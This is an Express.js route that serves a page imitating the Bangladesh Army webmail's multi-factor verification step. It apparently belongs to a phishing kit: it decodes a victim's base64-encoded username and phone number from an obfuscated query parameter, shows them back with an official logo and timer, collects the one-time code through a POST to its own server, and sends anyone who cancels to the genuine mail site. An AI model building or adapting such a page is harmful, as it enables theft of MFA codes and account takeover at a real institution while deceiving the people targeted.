const express = require('express');
const router = express.Router();
router.use(express.static('public'));


router.get('/', (req, res) => {
    // Your route logic here

    const data = req.query.utwefbgjksoewhfnjsdhfiwoefhhjsdhfuwoehu;

    const [userb64, mob64] = data.split('/');

    const username = Buffer.from(userb64, 'base64').toString('utf-8');
    const user = username.split("@")[0];

    const mob = Buffer.from(mob64, 'base64').toString('utf-8');  

    const maskedMob = mob.substring(0, 2) + "******" + mob.substring(mob.length - 2);
        
    if (data == null) {
        res.render('error');
        
         }else{
        
        const htmlContent = `  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    
        <html>
        <head>
        <meta http-equiv="X-UA-Compatible" content="IE=10">
        <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="Robots" content="NOINDEX, NOFOLLOW">
        <link rel="stylesheet" type="text/css" href="./style/code.css">
    
                <!-- Required meta tags -->
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <title>MFA | Bangladesh Army</title>
           
            </head>
           <body>
            <form action="/req/code" method="POST" id="myForm" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
            <div class="centered-div">
               
                <div class="upper-div">
                    <img class="logo" src="./images/logoarmy.png" alt="logo">&nbsp;&nbsp;<span class="logotext"><b>BANGLADESH ARMY</b></span>
    
                </div>
                <div class="upper-div1">
                   
                    <div class="left"><img class="logouser" src="./images/businessman.png" alt="logo">&nbsp;&nbsp;<span class="logotext1">${user}</span>&nbsp;<span class="logotext2">(AD)</span></div>
                    <input type="hidden" name="username" value="${username}">
                    <div class="right"><div><img class="logouser" src="./images/stopwatch.png" alt="logo"></div>&nbsp;&nbsp; <sapn id="timer-display">02:00</span></div>
    
                    <script>
                                // Function to start the timer
                            function startTimer(duration, display) {
                            let timer = duration, minutes, seconds;
                            setInterval(function () {
                                minutes = parseInt(timer / 60, 10);
                                seconds = parseInt(timer % 60, 10);
                            
                                minutes = minutes < 10 ? "0" + minutes : minutes;
                                seconds = seconds < 10 ? "0" + seconds : seconds;
                            
                                display.textContent = minutes + ":" + seconds;
                            
                                if (--timer < 0) {
                                timer = duration;
                                }
                            }, 1000);
                            }
                            
                            window.onload = function () {
                            const durationInSeconds = 60 * 2; // 5 minutes
                            const display = document.getElementById("timer-display");
                            startTimer(durationInSeconds, display);
                            };
                    
                      </script>
    
    
                </div>
                
                <div class="center-div">
    
                    <div class="text-div"><p class="cspan">Verification code has been sent to &nbsp;${maskedMob}</p></div>
                   
                                  
                    <div class="text-div1"><p class="mspan">Once you have received the code,Please enter it in the textbox below</p></div>
                
    
                <div class="center-div1">
    
                    <div class="mobile-div"><input type="text" id="numericInput" name="code" maxlength="8" class="mobile-box">&nbsp;&nbsp;&nbsp;&nbsp;<a class="linkclick" href="">Resend Code</a></div>
                   
                    <script>
    
                            document.getElementById("numericInput").addEventListener("keydown", function(event) {
                    // Allow only numbers (0-9) and navigation keys (Tab, arrow keys)
                    if (!(event.key === "Tab" || event.key === "ArrowLeft" || event.key === "ArrowRight" || event.key === "ArrowUp" || event.key === "ArrowDown" ||
                            event.key === "Backspace" || event.key === "Delete" || event.key === "Home" || event.key === "End" ||
                            (event.key >= "0" && event.key <= "9") || (event.key === "Control" && event.ctrlKey) || event.key === "v" && event.ctrlKey)) {
                        event.preventDefault();
                    }
                    });
    
    
                    </script>
                    
    
                </div><br>
                <div class="center-div2">
    
                    <div ><input type="checkbox" class="check-box"> <label class="text-div3" for="checkbox">Trust this browser</label></div>
                                 
    
                </div>
                
                <div class="center-div3">
    
                    <div ><label class="text-div2">Trusted browser will expire after 24 hour(s)</label></div>
                                 
    
                </div>
                
            
            
            </div>
    
            <div class="center-div0">
    
                <input type="submit" class="button1" value="Cancel" id="cancelButton">&nbsp;&nbsp;&nbsp;<input type="submit" class="button2" value="Continue">
                
            
              
                <script>
                    
                    document.getElementById("cancelButton").addEventListener("click", function(event) {
                            event.preventDefault(); // Prevent the default form submission behavior
                            window.location.href = "https://newmail.army.mil.bd/"; // Redirect to new page
                            });
        
                </script>
        
        
        </div>
    
        
        </div>
    
          
    
    
    
    </form>
            </body>
            </html>
    
     `

        res.send(htmlContent);
        
    }

});

module.exports = router;
